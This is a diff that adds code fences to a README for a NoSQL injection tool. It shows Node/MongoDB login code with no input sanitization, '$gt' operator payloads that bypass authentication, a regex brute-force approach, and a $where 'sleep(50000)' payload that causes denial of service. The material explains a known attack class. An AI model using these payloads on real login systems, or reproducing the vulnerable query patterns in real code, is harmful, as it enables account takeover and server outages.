@@ -6,7 +6,7 @@
 https://github.com/blessingcharles/nosqlInjector/
 
 ## if you check login like this without encrypting password we are in
-
+```js
     const {email , password} = req.body
 
         if(!email || !password) return res.json({error : "invalid data"})
@@ -27,9 +27,9 @@ https://github.com/blessingcharles/nosqlInjector/
             return res.json({msg:"you hacked it"})
         }
 
-
+```
 ## INJECTION VALUES
-
+```json
         {
             "email":{
                 "$gt":""
@@ -48,11 +48,13 @@ https://github.com/blessingcharles/nosqlInjector/
                 "$gt":""
             }
         }
+ ```
 [lack of proper sanitization may lead to leverage in lots of authorization issues]
 
 ### eventhough you encrypt your password and store , attacker can use regex to validate the name and bruteforce the password
 
         [codeSNIPPETS]
+```js
             try{
                 identifyUser = await User.findOne({email:email})
             }
@@ -69,7 +71,8 @@ https://github.com/blessingcharles/nosqlInjector/
                 error.code = 400
                 return next(error)
             }
-
+```
+```json
         INJECTION VALUE
 
         {
@@ -79,10 +82,11 @@ https://github.com/blessingcharles/nosqlInjector/
             "password":"thomas"
         }
 
+```
 
 #### use of where clause leads to usage of many functions like sleep leads to dos of the server
 
-
+```js
         let {email , password} = req.body
 
         if(!email || !password) return res.json({error : "invalid data"})
@@ -104,13 +108,14 @@ https://github.com/blessingcharles/nosqlInjector/
             console.log(err)
             return res.json({error : "something went wrong"})
         }
+```
 
 ## injecting value
-
+```json
     {
         "email":"';sleep(50000);'",
         "password":"thomas"
     }
-
+```
 
 
